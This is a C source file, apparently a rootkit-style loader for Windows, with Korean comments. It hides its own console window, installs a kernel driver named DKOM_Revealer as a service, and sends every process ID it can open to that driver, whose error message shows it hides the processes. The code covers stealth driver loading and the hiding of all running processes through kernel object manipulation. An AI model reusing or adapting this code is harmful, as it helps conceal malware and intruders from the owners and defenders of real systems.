#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>   // CreateToolhelp32Snapshot, etc...


#define MAX_SIZE 4096 /* For runtime injection */

bool _util_load_sysfile()
{
	LPCTSTR theDriverName = TEXT("DKOM_Revealer");
	LPCTSTR aPath = TEXT("C:\\Users\\eternalklaus\\Desktop\\DKOM_Revealer.sys");
	SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!sh)
	{
		return false;
	}
	SC_HANDLE rh = CreateService(sh, theDriverName, theDriverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, aPath, NULL, NULL, NULL, NULL, NULL);

	if (!rh)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)
		{
			rh = OpenService(sh, theDriverName, SERVICE_ALL_ACCESS);
			if (!rh)
			{
				printf("Cannot open service\n");
				CloseServiceHandle(sh);
				return false;
			}
		}
		else
		{
			printf("Cannot create service\n");
			CloseServiceHandle(sh);
			return false;
		}
	}

	if (rh)
	{
		if (0 == StartService(rh, 0, NULL))
		{
			DWORD imsi = GetLastError();
			if (imsi == ERROR_SERVICE_ALREADY_RUNNING)
			{
				printf("Service is already running\n");
			}
			else
			{
				printf("Cannot start service\n");
				CloseServiceHandle(sh);
				CloseServiceHandle(rh);
				return false;
			}
		}
		CloseServiceHandle(sh);
		CloseServiceHandle(rh);
	}
	printf("Service started successfully\n");
	return true;
}

int main()
{
	/*콘솔 감추기*/

	HWND hWndConsole = GetConsoleWindow();
	ShowWindow(hWndConsole, SW_HIDE);
	FILE *f;
	f = fopen("log.txt", "w");

	HANDLE hFile, hProc;
	DWORD ProcessId, write;
	char buffer[100];


	_util_load_sysfile(); //드라이버 설치

						  //\\.\프리픽스는 Win32디바이스 네임스페이스에 접근한다.  return : 장치를 제어할 수 있는 핸들
	hFile = CreateFile(L"\\\\.\\DKOM_Revealer", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		fprintf(f, "Error:(%d)\nMake sure the driver is loaded.\n", GetLastError());
		return -1;
	}
	ProcessId = 0;
	while (ProcessId<10000)
	{
		ProcessId += 4;
		hProc = NULL;
		hProc = OpenProcess(PROCESS_ALL_ACCESS, true, ProcessId);
		if (hProc == NULL)
		{
			continue;
		}
		GetModuleBaseNameA(hProc, NULL, buffer, 100);
		if (buffer[0] != '?')
		{
			fprintf(f, "%04d|%s|Success\n", ProcessId, buffer);
		}

		if (!WriteFile(hFile, &ProcessId, sizeof(DWORD), &write, NULL)) //디바이스 드라이버에 적용시키기.
		{
			fprintf(f, "\nError: Unable to hide process (%d)\n", GetLastError());
		}
		CloseHandle(hProc);
	}
	fclose(f);
	return 0;
}